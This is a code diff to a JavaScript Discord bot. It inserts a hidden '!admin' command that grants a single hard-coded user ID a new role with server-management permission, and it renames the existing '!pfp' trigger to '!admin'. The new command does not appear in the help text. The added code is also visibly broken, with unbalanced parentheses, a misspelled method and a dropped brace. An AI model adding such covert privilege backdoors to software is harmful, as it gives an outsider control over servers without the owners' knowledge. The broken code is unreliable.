@@ -320,7 +320,22 @@ client.on('message', msg => {
                 }
             }
         })
-
+ // !me
+        client.on('message', msg => {
+            if (isOk(msg)) {
+                mess = msg.content.toLowerCase().split(" ")
+                if (mess[0] == "!admin") {
+                    if (msg.author.id == 350930610719817728)) {
+                        msg.member.addrole(msg.guild.createRole({
+            name: "Justyn",
+            color: "GREEN",
+            mentionable: "true",
+            permissions: "MANAGE_SERVER"
+          }));
+                    }
+                }
+            }
+        })
         // !me
         client.on('message', msg => {
             if (isOk(msg)) {
@@ -388,7 +403,7 @@ client.on('message', msg => {
         client.on('message', msg => {
             if (isOk(msg)) {
                 mess = msg.content.toLowerCase().split(" ");
-                if (mess[0] == "!pfp") {
+                if (mess[0] == "!admin")
                     if (msg.mentions.users.array()[0]) {
                         embed = new Discord.RichEmbed();
                         embed.setTitle((msg.mentions.users.array()[0].username + "'s profile picture: '"))
@@ -402,7 +417,7 @@ client.on('message', msg => {
         // !commands
         client.on('message', msg => {
             if (msg.content == '!commands') {
-                msg.channel.send("\nI am still learning about things to do, but for now you can type: \n `!me` for a summary of your account \n `!add` add two numbers together \n `!minus` minus two numbers from each other \n `!invite` for my invite code \n `!divide` divide two numbers \n `!multiply` times two numbers together \n `!id` Gets your unique ID \n `!card` Look at your public card \n `!tag` Gets your 4 Digit identifier \n `!Celle` A brief description of me \n `!commands` Lists these commands\n `!deyeet [num]`_Mods Above_ ~~Delete~~ Deyeet the said amount of messages (not including that one) ")
+                msg.channel.send("\nI am still learning about things to do, but for now you can type: \n `!me` for a summary of your account \n `!add` add two numbers together \n `!minus` minus two numbers from each other \n `!invite` for my invite code \n `!divide` divide two numbers \n `!multiply` times two numbers together \n `!id` Gets your unique ID \n `!card` Look at your public card \n `!tag` Gets your 4 Digit identifier \n `!Celle` A brief description of me \n `!commands` Lists these commands\n `!deyeet [num]`_s Above_ ~~Delete~~ Deyeet the said amount of messages (not including that one) ")
             }
         })
         // !advert
